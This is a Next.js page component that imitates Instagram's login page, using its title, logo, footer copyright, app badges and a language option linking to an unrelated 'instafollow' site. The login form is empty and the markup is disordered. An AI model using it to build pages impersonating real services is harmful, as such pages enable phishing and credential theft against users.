import Head from 'next/head'
import Image from 'next/image'
import Script from 'next/script'
import Link from 'next/link'
import MadebyHM from "../components/MadebyHM";
import { Inter } from '@next/font/google'
import styles from '../styles/Home.module.css'

const inter = Inter({ subsets: ['latin'] })

export default function Home() {
  return (
    <>
      <Head>
        <title>Instagram</title>
        
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>  
<span id="root">
  <section className="section-all">
    <main className="main" role="main">
      <div className="wrapper">
        <article className="article">
          <div className="content">
            <div className="login-box">
              <div className="header">
                <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
              </div>{/* Header end */}
              <div className="form-wrap">
              </div></div></div></article></div></main></section></span>
      <MadebyHM />
<div>
  <a className="forgot" href>Forgot password?</a>
  {/* Form-wrap end */}
  {/* Login-box end */}
  <div className="login-box">
    <p className="text">Don't have an account?<a href="#">Sign up</a></p>
  </div> {/* Signup-box end */}
  <div className="app">
    <p>Get the app.</p>
    <div className="app-img">
      <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
      </a>
      <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />
      </a>  
    </div>  {/* App-img end*/}
  </div> {/* App end */}
  {/* Content end */}
  {/* Wrapper end */}
  {/* 2-Role Footer */}
  <footer className="footer" role="contentinfo">
    <div className="footer-container">
      <nav className="footer-nav" role="navigation">
        <ul>
          <li><a href>About Us</a></li>
          <li><a href>Support</a></li>
          <li><a href>Blog</a></li>
          <li><a href>Press</a></li>
          <li><a href>Api</a></li>
          <li><a href>Jobs</a></li>
          <li><a href>Privacy</a></li>
          <li><a href>Terms</a></li>
          <li><a href>Directory</a></li>
          <li>
            <span className="language">Language
              <select name="language" className="select" onchange="la(this.value)">
                <option value="#">English</option>
                <option value="http://ru-instafollow.bitballoon.com">Russian</option>
              </select>
            </span>
          </li>
        </ul>
      </nav>
      <span className="footer-logo">© 2023 Instagram</span>
    </div> {/* Footer container end */}
  </footer>
</div>
  </>

    
  )
}
